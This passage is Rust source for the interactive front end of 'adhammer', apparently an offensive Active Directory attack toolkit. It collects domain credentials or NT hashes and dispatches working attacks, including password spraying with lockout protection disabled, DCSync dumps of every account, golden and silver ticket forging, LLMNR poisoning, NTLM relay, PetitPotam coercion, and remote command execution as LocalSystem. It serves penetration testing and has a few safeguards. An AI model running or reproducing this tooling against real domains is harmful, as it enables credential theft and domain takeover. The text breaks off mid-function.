//! Interactive mode: `adhammer` prompts for domain creds, saves session, attack menu.
//! Reuse saved session with `adhammer --old`.

use anyhow::{Context, Result};
use dialoguer::{Confirm, Input, Password};
use std::time::Instant;

use crate::session::{self, Session};
use crate::{dcshadow, poison};

use crate::attacks::abuse::{abuse, AbuseAction, AbuseArgs};
use crate::attacks::asktgt::{asktgt, AsktgtArgs};
use crate::attacks::badsuccessor::{badsuccessor, BadsuccessorArgs};
use crate::attacks::coerce::{coerce, CoerceArgs, CoercePipe};
use crate::attacks::dcsync::{dcsync, DcsyncArgs};
use crate::attacks::dns::{dns as attack_dns, DnsAction, DnsArgs as AttackDnsArgs};
use crate::attacks::esc1::{esc1, Esc1Args};
use crate::attacks::esc4::{esc4, Esc4Args};
use crate::attacks::exec_pack::{exec_cmd, wmiexec_cmd, ExecArgs};
use crate::attacks::gmsa::{gmsa, GmsaArgs};
use crate::attacks::golden::{golden, GoldenArgs};
use crate::attacks::laps::{laps, LapsArgs};
use crate::attacks::lsa::{lsa, LsaArgs};
use crate::attacks::mssql::{mssql, MssqlArgs};
use crate::attacks::ptt::{pth, PthArgs};
use crate::attacks::rbcd::{rbcd, RbcdArgs};
use crate::attacks::relay::{relay, RelayArgs, RelayTarget};
use crate::attacks::roast::roast;
use crate::attacks::samr::{samr, SamrArgs};
use crate::attacks::scan::scan;
use crate::attacks::secretsdump::{secretsdump, SecretsdumpArgs};
use crate::attacks::shadowcred::{shadowcred, ShadowcredArgs};
use crate::attacks::silver::{silver, SilverArgs};
use crate::attacks::spray::{spray, SprayArgs};
use crate::attacks::unconstrained::unconstrained;
use crate::attacks::winrm_exec::{winrm_exec, WinrmArgs};
use crate::attacks::zerologon::{zerologon, ZerologonArgs};
use crate::enums::adcs::adcsenum;
use crate::enums::dns::{dnsenum, DnsArgs};
use crate::enums::esc_registry::{esc_registry_scan, EscArgs};
use crate::enums::net::{netenum, NetArgs};
use crate::enums::posture::{posture_scan, PostureArgs};
use crate::enums::sccm::{sccmenum, scomenum, SysCenterArgs};
use crate::enums::sessions::{sessions, SessionsArgs};

/// Default Domain-Admin group RID set embedded in forged tickets.
const DA_GROUPS: &[u32] = &[513, 512, 520, 518, 519];

enum Action {
    Scan,
    Guided,
    Roast,
    Spray,
    EnumSamr,
    EnumLsa,
    NetSweep,
    DnsEnum,
    AdcsEnum,
    EnumEsc,
    EnumPosture,
    Abuse,
    Coerce,
    Zerologon,
    Rbcd,
    Dcsync,
    Capture,
    Poison,
    Relay,
    Exec,
    Wmiexec,
    Winrm,
    Secretsdump,
    Gmsa,
    Laps,
    Esc1,
    Asktgt,
    Golden,
    Silver,
    Pth,
    EnumSessions,
    Unconstrained,
    Shadowcred,
    Esc4,
    Badsuccessor,
    Dcshadow,
    Constrained,
    Mssql,
    AttackDns,
    EnumSccm,
    EnumScom,
    ShowRoadmap,
    WipeSession,
    Exit,
}

/// Two-level grouped menu (ux-7). First Select picks a category; second Select
/// picks an action inside it (plus a `← Back` option to return to categories).
/// Categories are ordered by attacker workflow: Recon → Creds → Lateral →
/// Persist → Session (housekeeping).
const CATEGORIES: &[(&str, &[(&str, Action)])] = &[
    (
        "Recon — passive enumeration + safe probes",
        &[
            ("Scan — passive audit (scored checks + graph)", Action::Scan),
            (
                "Guided — scan → validate + PoC report (MD/HTML/JSON/TXT)",
                Action::Guided,
            ),
            ("Enum SAMR — list domain users", Action::EnumSamr),
            ("Enum LSA — name to SID", Action::EnumLsa),
            (
                "Enum sessions — SRVSVC NetrSessionEnum (session hunting)",
                Action::EnumSessions,
            ),
            ("Net — network sweep", Action::NetSweep),
            ("DNS — enumerate ADIDNS zones/records", Action::DnsEnum),
            (
                "AD CS — enumerate CAs + ESC8 web-enrollment check",
                Action::AdcsEnum,
            ),
            (
                "ESC (registry) — ESC6/7/10/11/16 over MS-RRP",
                Action::EnumEsc,
            ),
            (
                "Posture — LDAP signing / channel binding + Spooler (relay enablers)",
                Action::EnumPosture,
            ),
            (
                "Unconstrained delegation — list TRUSTED_FOR_DELEGATION hosts",
                Action::Unconstrained,
            ),
            (
                "DCShadow — enumerate accounts holding DCSync rights",
                Action::Dcshadow,
            ),
            (
                "Zerologon — CVE-2020-1472 SAFE detection (no reset)",
                Action::Zerologon,
            ),
            (
                "SCCM — enumerate CN=System Management (Management Points, site codes)",
                Action::EnumSccm,
            ),
            (
                "SCOM — enumerate CN=OperationsManager (mgmt servers, gateways)",
                Action::EnumScom,
            ),
        ],
    ),
    (
        "Creds — obtain hashes, tickets, or forged material",
        &[
            ("Roast — Kerberoast + AS-REP", Action::Roast),
            ("Spray — password spray", Action::Spray),
            ("DCSync — replicate secrets", Action::Dcsync),
            (
                "Secretsdump — local SAM hashes (reg save + C$)",
                Action::Secretsdump,
            ),
            ("gMSA — read managed password → NT hash", Action::Gmsa),
            ("LAPS — read local-admin passwords", Action::Laps),
            ("AskTGT — password → Kerberos ccache", Action::Asktgt),
            ("Golden — forge a TGT (krbtgt key)", Action::Golden),
            (
                "Silver — forge a service ticket (service key)",
                Action::Silver,
            ),
        ],
    ),
    (
        "Lateral — active attack primitives",
        &[
            ("Abuse — LDAP write (SPN / keycred / RBCD …)", Action::Abuse),
            ("Coerce — PetitPotam / PrinterBug", Action::Coerce),
            ("Capture — NTLM listener", Action::Capture),
            ("Poison — LLMNR / NBT-NS", Action::Poison),
            ("Relay — NTLM → LDAP / AD CS / ICPR", Action::Relay),
            (
                "Pass-the-ticket — forge → Kerberos SMB → run as SYSTEM",
                Action::Pth,
            ),
            (
                "Constrained delegation — S4U2Self+S4U2Proxy via AllowedToDelegateTo",
                Action::Constrained,
            ),
            ("RBCD — impersonation chain", Action::Rbcd),
            (
                "Exec — SVCCTL command as LocalSystem (psexec)",
                Action::Exec,
            ),
            (
                "WMIexec — DCOM Win32_Process.Create (output over C$)",
                Action::Wmiexec,
            ),
            ("WinRM — run a command over WS-Man (5985)", Action::Winrm),
            ("ESC1 — AD CS cert enroll (spoofed UPN SAN)", Action::Esc1),
            (
                "ESC4 — flip a cert template's flags → ESC1-vulnerable",
                Action::Esc4,
            ),
            (
                "BadSuccessor (2025) — dMSA that succeeds a Domain Admin",
                Action::Badsuccessor,
            ),
            (
                "MSSQL — xp_cmdshell / EXECUTE AS impersonation",
                Action::Mssql,
            ),
            (
                "ADIDNS write — add/modify/tombstone/delete A record (dry-run gated)",
                Action::AttackDns,
            ),
        ],
    ),
    (
        "Persist — implants + shadow accounts",
        &[(
            "Shadow Credentials — plant KeyCredentialLink (+ PKINIT chain)",
            Action::Shadowcred,
        )],
    ),
    (
        "Session — roadmap, wipe creds, exit",
        &[
            (
                "Show open vectors (VECTORS.md summary)",
                Action::ShowRoadmap,
            ),
            (
                "Wipe saved session (delete creds from disk)",
                Action::WipeSession,
            ),
            ("Exit", Action::Exit),
        ],
    ),
];

fn intro_enabled() -> bool {
    std::env::var("ADHAMMER_UI_INTRO").map_or(true, |v| v != "0")
}

/// Opening splash shown once per interactive run.
fn intro_sequence(_sess: &session::Session) {
    use crate::ui;
    if !intro_enabled() {
        return;
    }

    let art = [
        "   █████╗ ██████╗ ██╗  ██╗ █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗ ",
        "  ██╔══██╗██╔══██╗██║  ██║██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗",
        "  ███████║██║  ██║███████║███████║██╔████╔██║██╔████╔██║█████╗  ██████╔╝",
        "  ██╔══██║██║  ██║██╔══██║██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██╔══██╗",
        "  ██║  ██║██████╔╝██║  ██║██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║",
        "  ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝",
    ];

    eprintln!();
    for line in art {
        eprintln!("{}", ui::accent_err(line));
        ui::beat_for(ui::Pace::Fast);
    }
    ui::note("   supported findings -> validate -> export");
    ui::hold_for(ui::Pace::Important);
}

/// Compact banner shown above the interactive menu after the intro splash.
fn banner(sess: &session::Session, verbose_auto_forced: bool) {
    use crate::ui;
    eprintln!();
    eprintln!(
        "  {} {}  {} {}  {} {}  {} {}",
        ui::sticker("ADHAMMER", ui::Tone::Accent),
        ui::accent_err(env!("CARGO_PKG_VERSION")),
        ui::sticker("DOMAIN", ui::Tone::Dim),
        ui::green_err(&sess.domain),
        ui::sticker("DC", ui::Tone::Dim),
        ui::green_err(&sess.dc),
        ui::sticker("USER", ui::Tone::Dim),
        ui::green_err(&sess.username),
    );
    ui::note("  Auto = scan -> validate -> export    Single attack = brief -> run -> proof");
    // WS-1.4.7-P2-E: honest verbosity tip. Prior text ("wire trace on by default") lied
    // twice — it claimed wire-layer trace but adhammer's dcerpc / smb2-client / ntlmssp
    // deps carry ~zero tracing calls today, so at any -v level the actual output is
    // sparse (a handful of INFO narrations + a few WARN lines). And it printed even
    // when the user passed --quiet-interactive, which was the opposite state. Now:
    // only render when the auto-force actually fired, and describe what fires.
    if verbose_auto_forced {
        ui::note("  tip: verbose narration on (--quiet-interactive to silence)");
    }
}

pub async fn run(use_old: bool, no_save: bool, verbose_auto_forced: bool) -> Result<()> {
    let reuse = use_old
        || (session::exists()
            && prompt_confirm(
                "Saved session found — reuse it? (No = enter new credentials)",
                true,
            )?);
    let sess = if reuse {
        session::load()?
    } else {
        let s = setup_wizard()?;
        if no_save {
            eprintln!("[*] --no-save: session (creds) will NOT be written to disk");
        } else {
            save_session_for_interactive(&s)?;
        }
        s
    };

    intro_sequence(&sess);

    'outer: loop {
        banner(&sess, verbose_auto_forced);

        // Front door: two modes + session. Auto is the default (just press Enter).
        let mode = prompt_select(
            "Mode",
            &[
                "Auto — scan, then chain impact on the findings you pick",
                "Single attack — pick one technique (grouped)",
                "Session — open vectors / wipe creds / exit",
            ],
            0,
        )
        .context("mode cancelled")?;

        match mode {
            // AUTO: guided scan → findings list → pick which to impact → chain + PoC report.
            0 => {
                // WS-1.4.7-P2-C: dedupe error display. run_action_with_brief() already
                // renders a full failure card (checklist.mark_current_failed + outcome
                // header + field_err("reason", ...) + diagnose_connection_error + hint).
                // Re-emitting `ui::bad(e)` here painted the same message a THIRD time,
                // making one connection-refused look like a wall of red. Drop the error
                // — the inner render is the authoritative surface.
                let _ = run_action_with_brief(&Action::Guided, &sess).await;
            }
            // SINGLE ATTACK: pick an attack category, then a technique (Session category excluded).
            1 => {
                let attack_cats = &CATEGORIES[..CATEGORIES.len() - 1];
                let mut cat_labels: Vec<String> =
                    attack_cats.iter().map(|(l, _)| (*l).to_string()).collect();
                cat_labels.push("← Back".to_string());
                let ci = prompt_select("Category", &cat_labels, 0).context("category cancelled")?;
                if ci == attack_cats.len() {
                    continue 'outer; // Back
                }

                let actions = attack_cats[ci].1;
                let mut action_labels: Vec<String> =
                    actions.iter().map(|(l, _)| (*l).to_string()).collect();
                action_labels.push("← Back".to_string());
                let ai = prompt_select(attack_cats[ci].0, &action_labels, 0)
                    .context("action cancelled")?;
                if ai == actions.len() {
                    continue 'outer; // Back
                }
                // WS-1.4.7-P2-C: dedupe. See guided-branch comment above — the inner
                // render is authoritative; the outer `ui::bad(e)` was a third print.
                let _ = run_action_with_brief(&actions[ai].1, &sess).await;
            }
            // SESSION: open vectors / wipe creds / exit (the last category).
            _ => {
                let sess_actions = CATEGORIES[CATEGORIES.len() - 1].1;
                let labels: Vec<String> =
                    sess_actions.iter().map(|(l, _)| (*l).to_string()).collect();
                let si = prompt_select("Session", &labels, labels.len() - 1)
                    .context("session cancelled")?;
                match &sess_actions[si].1 {
                    Action::Exit => break,
                    Action::ShowRoadmap => print_roadmap_summary(),
                    Action::WipeSession => {
                        if prompt_confirm(
                            "Really wipe the saved session? (deletes your creds from disk)",
                            false,
                        )
                        .unwrap_or(false)
                        {
                            session::wipe().ok();
                        } else {
                            crate::ui::info("kept — session not wiped");
                        }
                    }
                    _ => {}
                }
            }
        }
    }

    Ok(())
}

fn setup_wizard() -> Result<Session> {
    crate::ui::header_err("ADhammer setup");
    crate::ui::note("Enter the engagement target (saved for `adhammer --old`).");
    crate::ui::note("Controls: Enter=default  y=yes  n=no  Ctrl+C=cancel");

    // 1. user  2. password | NT hash  3. domain  4. domain-controller IP  5. TLS.
    let username: String = Input::new()
        .with_prompt("User (test account / bind identity)")
        .with_initial_text("administrator")
        .interact_text()
        .context("username prompt")?;
    // Accept the common `DOMAIN/user` typo: AD principals are `DOMAIN\user` (NETBIOS) or
    // `user@domain` (UPN); a forward slash is never valid in a sAMAccountName, so normalize it
    // to a backslash rather than letting the bind fail with a confusing `data 52e`.
    let username = username.trim().replace('/', "\\");

    let auth = prompt_select(
        "Authenticate with",
        &["Password", "NT hash (pass-the-hash)"],
        0,
    )
    .context("auth prompt")?;
    let (password, nt_hash) = if auth == 0 {
        (prompt_password("Password")?, None)
    } else {
        // WS-1.4.7-P1-A: NT hash is a password-equivalent secret — MUST be hidden. Prior
        // `Input::new().interact_text()` echoed the hash to the terminal, leaving it in
        // scrollback / tmux history / SSH logs. WS-1.4.7-P2-A: also enforce hex-alphabet
        // (32 chars of `ZZZ...Z` used to pass the length-only check and produce a bind
        // that failed downstream with a confusing error rather than at the prompt).
        let h: String = Password::new()
            .with_prompt("NT hash (32 hex)")
            .validate_with(|s: &String| -> Result<(), String> {
                let t = s.trim();
                if t.len() != 32 {
                    return Err(format!("expected 32 hex chars, got {}", t.len()));
                }
                if !t.chars().all(|c| c.is_ascii_hexdigit()) {
                    return Err("must contain only hex characters [0-9a-fA-F]".into());
                }
                Ok(())
            })
            .interact()?;
        // A blank password is kept so Kerberos/DCSync actions can report they need one.
        (String::new(), Some(h.trim().to_string()))
    };

    let domain: String = Input::new()
        .with_prompt("Domain (DNS, e.g. corp.local)")
        .with_initial_text("corp.local")
        .interact_text()
        .context("domain prompt")?;

    let dc: String = Input::new()
        .with_prompt("Domain controller IP (or hostname)")
        .interact_text()
        .context("dc prompt")?;

    let insecure = prompt_confirm("Skip LDAPS certificate verification (lab DC)?", true)
        .context("insecure prompt")?;

    // Probe LDAPS (636) reachability, fall back to plain LDAP (389) when the DC has no
    // TLS certificate or the handshake is refused. Common on Server 2019/2022 lab DCs
    // that were built without an ADCS role — those refuse 636 with `Connection reset by
    // peer` mid-handshake, so any interactive path hardcoded to `ldaps://<dc>:636` dies
    // before the first bind. CLI callers who pass `--url ldap://<dc>:389 --insecure`
    // sidestep this; the wizard now does the same automatically.
    let dc_clean = dc.trim().to_string();
    // WS-1.4.7-P1-B: automatic plaintext-LDAP downgrade is a SILENT-plaintext-password
    // vulnerability. Prior behavior: if LDAPS:636 was unreachable, the wizard just
    // warn()'d and quietly stored `ldap://<dc>:389` — the collector then did a simple
    // bind, sending the user's password in cleartext without any explicit consent.
    // Now: any downgrade requires an explicit y-prompt that defaults to NO and refuses
    // to proceed otherwise, so plaintext-over-the-wire is always an opt-in decision.
    let ldap_url_override = match probe_ldap_scheme(&dc_clean) {
        Some(ldap_url) => {
            crate::ui::warn(&format!(
                "LDAPS (636) unreachable on {dc_clean}. The plain-LDAP fallback on port 389 sends \
                 your bind password OVER THE NETWORK IN THE CLEAR — any local listener \
                 (mitm6 / responder / a passive sniffer on the same segment) can capture it. \
                 Lab DCs without ADCS commonly land here; production or shared segments \
                 usually should not.",
            ));
            if !prompt_confirm(
                "Proceed with PLAINTEXT LDAP on 389 (password sent unencrypted)?",
                false,
            )
            .context("plaintext-LDAP consent prompt")?
            {
                anyhow::bail!(
                    "refused plaintext LDAP fallback — install an ADCS role on {dc_clean} \
                     (or point --url at an LDAPS-capable DC) then re-run",
                );
            }
            Some(ldap_url)
        }
        None => None,
    };

    Ok(Session {
        domain: domain.trim().to_string(),
        dc: dc_clean,
        username: username.trim().to_string(),
        password: adhammer_core::Redacted::new(password),
        nt_hash: nt_hash.map(adhammer_core::Redacted::new),
        insecure,
        ldap_url_override,
    })
}

/// Probe `ldaps://<dc>:636`; return `Some("ldap://<dc>:389")` if the LDAPS handshake
/// isn't going to work (port closed, connection reset, no listener). Returns `None`
/// when LDAPS is available so the caller falls through to the default `ldap_url()`.
///
/// Uses a plain TCP connect + short read: LDAPS servers always respond to a TCP SYN
/// with SYN-ACK and then wait for the ClientHello. If we see RST or timeout, LDAPS is
/// not the right transport. 3-second budget so the wizard stays snappy.
fn probe_ldap_scheme(dc: &str) -> Option<String> {
    use std::io::{Read, Write};
    use std::net::TcpStream;
    use std::time::Duration;
    let addr = format!("{dc}:636");
    let deadline = Duration::from_secs(3);
    match TcpStream::connect_timeout(
        &addr.parse().ok().or_else(|| {
            // hostnames: resolve then connect
            std::net::ToSocketAddrs::to_socket_addrs(&addr)
                .ok()
                .and_then(|mut it| it.next())
        })?,
        deadline,
    ) {
        Ok(mut stream) => {
            stream.set_read_timeout(Some(deadline)).ok();
            // Send a minimal TLS ClientHello prefix; if the server RSTs immediately, it
            // doesn't speak TLS on 636 (some lab DCs listen on 636 but reject TLS).
            let hello = [0x16, 0x03, 0x01, 0x00, 0x05, 0x01, 0x00, 0x00, 0x01, 0x00];
            if stream.write_all(&hello).is_err() {
                return Some(format!("ldap://{dc}:389"));
            }
            let mut buf = [0u8; 1];
            match stream.read(&mut buf) {
                Ok(0) => Some(format!("ldap://{dc}:389")), // clean close = no TLS
                Ok(_) => None,                             // got server hello prefix
                Err(_) => Some(format!("ldap://{dc}:389")), // timeout or RST
            }
        }
        Err(_) => Some(format!("ldap://{dc}:389")),
    }
}

/// The session's NT hash as `Option<String>` for the pass-the-hash-capable actions.
fn sess_hash(s: &Session) -> Option<String> {
    s.nt_hash.as_ref().map(|h| h.expose().clone())
}

fn save_session_for_interactive(sess: &Session) -> Result<()> {
    if !session::would_save_cleartext() {
        session::save(sess)?;
        return Ok(());
    }

    crate::ui::outcome(
        crate::ui::OutcomeKind::Blocked,
        "session encryption unavailable on this OS",
    );
    crate::ui::note("Choose how to continue on this lab host.");
    let choice = prompt_select(
        "Session save",
        &[
            "Save unencrypted for this lab",
            "Continue without saving",
            "Cancel setup",
        ],
        1,
    )?;
    match choice {
        0 => session::save_allow_cleartext(sess)?,
        1 => crate::ui::outcome(
            crate::ui::OutcomeKind::Skipped,
            "continuing without a saved session (`--old` will not work later)",
        ),
        _ => anyhow::bail!("setup cancelled before saving the session"),
    }
    Ok(())
}

async fn dispatch(action: &Action, s: &Session) -> Result<()> {
    match action {
        Action::Scan => scan(s.scan_args()).await,
        Action::Guided => {
            // Impact is a per-finding y/n prompt inside `guided()` now (not an up-front
            // choice) — so the operator sees each finding and decides whether they want
            // its attack-chain narrative before moving on.
            crate::guided::guided(crate::guided::GuidedArgs {
                url: s.ldap_url(),
                user: s.username.clone(),
                password: s.password.expose().clone(),
                insecure: s.insecure,
                host: Some(s.dc.clone()),
                domain: Some(s.netbios()),
                realm: Some(s.realm()),
                kdc: Some(s.dc.clone()),
                out: "adhammer-pentest-report.md".into(),
                yes: false,
                no_impact: false,
            })
            .await
        }
        Action::Roast => roast(s.scan_args()).await,
        Action::Spray => {
            let users: String = Input::new()
                .with_prompt("Users (@file or comma-separated)")
                .with_initial_text("@users.txt")
                .interact_text()?;
            let password: String = Password::new()
                .with_prompt("Password to spray")
                .interact()
                .or_else(|_| prompt_password("Password to spray"))?;
            spray(SprayArgs {
                kdc: s.dc.clone(),
                realm: s.realm(),
                users,
                password,
                lockout_threshold: 0,
                lockout_window: 300,
            })
            .await
        }
        Action::EnumSamr => {
            samr(SamrArgs {
                auth: crate::shared_args::SmbAuth {
                    host: s.dc.clone(),
                    domain: s.netbios(),
                    user: s.username.clone(),
                    password: s.password.expose().clone(),
                },
                nt_hash: sess_hash(s),
            })
            .await
        }
        Action::EnumLsa => {
            let name: String = Input::new()
                .with_prompt("Account name to resolve")
                .with_initial_text("Administrator")
                .interact_text()?;
            lsa(LsaArgs {
                auth: crate::shared_args::SmbAuth {
                    host: s.dc.clone(),
                    domain: s.netbios(),
                    user: s.username.clone(),
                    password: s.password.expose().clone(),
                },
                nt_hash: sess_hash(s),
                name,
            })
            .await
        }
        Action::NetSweep => {
            // Default to the DC's own /24 — accepting a hardcoded 10.0.0.0/24 on a real
            // engagement just sweeps an empty range and looks broken.
            let default_targets =
                s.dc.parse::<std::net::Ipv4Addr>()
                    .map(|ip| {
                        let o = ip.octets();
                        format!("{}.{}.{}.0/24", o[0], o[1], o[2])
                    })
                    .unwrap_or_else(|_| "10.0.0.0/24".to_string());
            let targets: String = Input::new()
                .with_prompt("Targets (CIDR, comma-list, or @file)")
                .with_initial_text(&default_targets)
                .interact_text()?;
            let deep = Confirm::new()
                .with_prompt(
                    "Deep checks (FTP·SMTP·DNS/AXFR·NFS·rsync·SNMP·RPC/EPM·WinRM·VNC·Redis)?",
                )
                .default(false)
                .interact()?;
            let zone = if deep {
                let z: String = Input::new()
                    .with_prompt("DNS zone for AXFR (blank to skip)")
                    .with_initial_text(&s.domain)
                    .allow_empty(true)
                    .interact_text()?;
                (!z.trim().is_empty()).then(|| z.trim().to_string())
            } else {
                None
            };
            netenum(NetArgs {
                targets,
                concurrency: 256,
                deep,
                zone,
                community: "public,private".to_string(),
            })
            .await
        }
        Action::DnsEnum => {
            dnsenum(DnsArgs {
                url: s.ldap_url(),
                user: s.username.clone(),
                password: s.password.expose().clone(),
                insecure: s.insecure,
            })
            .await
        }
        Action::EnumSccm => {
            sccmenum(SysCenterArgs {
                url: s.ldap_url(),
                user: s.username.clone(),
                password: s.password.expose().clone(),
                insecure: s.insecure,
            })
            .await
        }
        Action::EnumScom => {
            scomenum(SysCenterArgs {
                url: s.ldap_url(),
                user: s.username.clone(),
                password: s.password.expose().clone(),
                insecure: s.insecure,
            })
            .await
        }
        Action::AttackDns => {
            let actions = [
                DnsAction::AddA,
                DnsAction::ModifyA,
                DnsAction::Tombstone,
                DnsAction::Delete,
            ];
            let labels = ["add-a", "modify-a", "tombstone", "delete"];
            let ai = prompt_select("ADIDNS action", &labels, 0)?;
            let name: String = Input::new()
                .with_prompt("Record name (relative like `www`, or FQDN)")
                .interact_text()?;
            let need_ip = matches!(actions[ai], DnsAction::AddA | DnsAction::ModifyA);
            let ip: String = if need_ip {
                Input::new()
                    .with_prompt("IPv4 address (a.b.c.d)")
                    .interact_text()?
            } else {
                String::new()
            };
            let forest = Confirm::new()
                .with_prompt("Target ForestDnsZones instead of DomainDnsZones?")
                .default(false)
                .interact()?;
            // Interactive default = dry-run ON (mirrors the "no destructive writes without explicit
            // ack" pattern used for Zerologon detection). Operator can opt out with the confirm.
            let live = Confirm::new()
                .with_prompt("Perform the write LIVE against the DC (No = dry-run)?")
                .default(false)
                .interact()?;
            attack_dns(AttackDnsArgs {
                auth: crate::shared_args::OptAuth {
                    url: Some(s.ldap_url()),
                    user: Some(s.username.clone()),
                    password: Some(s.password.expose().clone()),
                    insecure: s.insecure,
                },
                action: actions[ai],
                name,
                ip,
                zone: None,
                forest,
                ttl: 3600,
                dry_run: !live,
            })
            .await
        }
        Action::AdcsEnum => {
            adcsenum(DnsArgs {
                url: s.ldap_url(),
                user: s.username.clone(),
                password: s.password.expose().clone(),
                insecure: s.insecure,
            })
            .await
        }
        Action::EnumEsc => {
            let ca: String = Input::new()
                .with_prompt("CA name (the Configuration\\<CA> key, e.g. corp-CA)")
                .interact_text()?;
            esc_registry_scan(EscArgs {
                auth: crate::shared_args::SmbAuth {
                    host: s.dc.clone(),
                    domain: s.netbios(),
                    user: s.username.clone(),
                    password: s.password.expose().clone(),
                },
                ca,
            })
            .await
        }
        Action::EnumPosture => {
            posture_scan(PostureArgs {
                auth: crate::shared_args::SmbAuth {
                    host: s.dc.clone(),
                    domain: s.netbios(),
                    user: s.username.clone(),
                    password: s.password.expose().clone(),
                },
            })
            .await
        }
        Action::Zerologon => {
            let netbios: String = Input::new()
                .with_prompt("DC NetBIOS computer name (e.g. DC01)")
                .interact_text()?;
            // Interactive mode offers SAFE detection only — never the destructive exploit.
            zerologon(ZerologonArgs {
                host: s.dc.clone(),
                netbios,
                attempts: 2000,
                exploit: false,
                yes: false,
                confirm_brick_risk: false,
                domain: s.netbios(),
                restore: None,
                restore_password: None,
            })
            .await
        }
        Action::Abuse => {
            let actions = [
                AbuseAction::AddSpn,
                AbuseAction::AddMember,
                AbuseAction::SetPassword,
                AbuseAction::AddKeycred,
                AbuseAction::WriteRbcd,
                AbuseAction::Pkinit,
            ];
            let labels = [
                "add-spn",
                "add-member",
                "set-password",
                "add-keycred",
                "write-rbcd",
                "pkinit",
            ];
            let ai = prompt_select("Abuse action", &labels, 0)?;
            let target: String = Input::new()
                .with_prompt("Target sAMAccountName")
                .interact_text()?;
            // WS-1.4.7-P1-A: `set-password` value is a password-equivalent secret and
            // MUST be hidden. The other actions take SPNs / trustee SIDs / group names
            // that are OK to echo, so keep the plaintext Input path for those.
            let value: String = if labels[ai] == "set-password" {
                prompt_password("New password for target")?
            } else {
                Input::new()
                    .with_prompt(
                        "Value (SPN / member / trustee SID — empty for pkinit key default)",
                    )
                    .allow_empty(true)
                    .interact_text()?
            };
            abuse(AbuseArgs {
                auth: crate::shared_args::OptAuth {
                    url: Some(s.ldap_url()),
                    user: Some(s.username.clone()),
                    password: Some(s.password.expose().clone()),
                    insecure: s.insecure,
                },
                action: actions[ai],
                target,
                value,
                realm: Some(s.domain.clone()),
                kdc: Some(s.dc.clone()),
                ldap389: false,
                host: Some(s.dc.clone()),
                dry_run: false,
            })
            .await
        }
        Action::Coerce => {
            let listener: String = Input::new()
                .with_prompt("Listener IP (where DC should auth to)")
                .interact_text()?;
            let pipes = ["lsarpc (PetitPotam)", "efsrpc", "spoolss (PrinterBug)"];
            let pi = prompt_select("Coercion vector", &pipes, 0)?;
            let pipe = match pi {
                1 => CoercePipe::Efsrpc,
                2 => CoercePipe::Spoolss,
                _ => CoercePipe::Lsarpc,
            };
            coerce(CoerceArgs {
                auth: crate::shared_args::SmbAuth {
                    host: s.dc.clone(),
                    domain: s.netbios(),
                    user: s.username.clone(),
                    password: s.password.expose().clone(),
                },
                listener,
                pipe,
                target: None,
            })
            .await
        }
        Action::Rbcd => {
            let account: String = Input::new()
                .with_prompt("Controlled account (RBCD trustee)")
                .interact_text()?;
            let account_password: String = Password::new()
                .with_prompt("Controlled account password")
                .interact()
                .or_else(|_| prompt_password("Controlled account password"))?;
            let impersonate: String = Input::new()
                .with_prompt("User to impersonate")
                .with_initial_text("Administrator")
                .interact_text()?;
            let target_spn: String = Input::new()
                .with_prompt("Target service SPN (e.g. cifs/dc.corp.local)")
                .interact_text()?;
            rbcd(RbcdArgs {
                kdc: s.dc.clone(),
                realm: s.realm(),
                account,
                account_password,
                impersonate,
                target_spn,
            })
            .await
        }
        Action::Dcsync => {
            let all = prompt_confirm("Dump ALL domain accounts (full secretsdump)?", false)?;
            let target: String = if all {
                String::new()
            } else {
                Input::new()
                    .with_prompt("Target account (empty = bind-only test)")
                    .allow_empty(true)
                    .interact_text()?
            };
            dcsync(DcsyncArgs {
                auth: crate::shared_args::SmbAuth {
                    host: s.dc.clone(),
                    domain: s.netbios(),
                    user: s.username.clone(),
                    password: s.password.expose().clone(),
                },
                target: if target.is_empty() {
                    None
                } else {
                    Some(target)
                },
                all,
                // Interactive-mode users just clicked "run" — treat it as explicit consent
                // rather than double-prompting them.
                yes: true,
                limit: None,
            })
            .await
        }
        Action::Capture => {
            let listen: String = Input::new()
                .with_prompt("Listen address")
                .with_initial_text("0.0.0.0:445")
                .interact_text()?;
            smb2_client::server::capture(&listen)
                .await
                .map_err(Into::into)
        }
        Action::Poison => {
            let ip: String = Input::new()
                .with_prompt("Spoof IP (your capture listener)")
                .interact_text()?;
            let spoof_ip: std::net::Ipv4Addr = ip.parse().context("invalid IPv4")?;
            poison::poison(spoof_ip).await
        }
        Action::Relay => {
            let listen: String = Input::new()
                .with_prompt("SMB listen address")
                .with_initial_text("0.0.0.0:445")
                .interact_text()?;
            let target_object: String = Input::new()
                .with_prompt("Target object (sAMAccountName for shadow cred)")
                .interact_text()?;
            relay(RelayArgs {
                listen,
                target_dc: s.dc.clone(),
                realm: s.domain.clone(),
                target_object,
                target: RelayTarget::LdapKeycred,
                trustee_sid: None,
                ca_host: None,
                ca_template: "User".into(),
                ca_port: 443,
                ca_insecure: true,
            })
            .await
        }
        Action::Exec => {
            let command: String = Input::new()
                .with_prompt("Command to run as LocalSystem")
                .with_initial_text("whoami")
                .interact_text()?;
            exec_cmd(ExecArgs {
                auth: crate::shared_args::SmbAuth {
                    host: s.dc.clone(),
                    domain: s.netbios(),
                    user: s.username.clone(),
                    password: s.password.expose().clone(),
                },
                nt_hash: sess_hash(s),
                command,
            })
            .await
        }
        Action::Wmiexec => {
            let command: String = Input::new()
                .with_prompt("Command to run over WMI (Win32_Process.Create)")
                .with_initial_text("whoami")
                .interact_text()?;
            wmiexec_cmd(ExecArgs {
                auth: crate::shared_args::SmbAuth {
                    host: s.dc.clone(),
                    domain: s.netbios(),
                    user: s.username.clone(),
                    password: s.password.expose().clone(),
                },
                nt_hash: sess_hash(s),
                command,
            })
            .await
        }
        Action::Winrm => {
            let host: String = Input::new()
                .with_prompt("WinRM target host/IP")
                .with_initial_text(&s.dc)
                .interact_text()?;
            let command: String = Input::new()
                .with_prompt("Command to run (via cmd.exe /c)")
                .with_initial_text("whoami")
                .interact_text()?;
            winrm_exec(WinrmArgs {
                auth: crate::shared_args::SmbAuth {
                    host,
                    domain: s.netbios(),
                    user: s.username.clone(),
                    password: s.password.expose().clone(),
                },
                port: 5985,
                nt_hash: sess_hash(s),
                command,
            })
            .await
        }
        Action::Secretsdump => {
            secretsdump(SecretsdumpArgs {
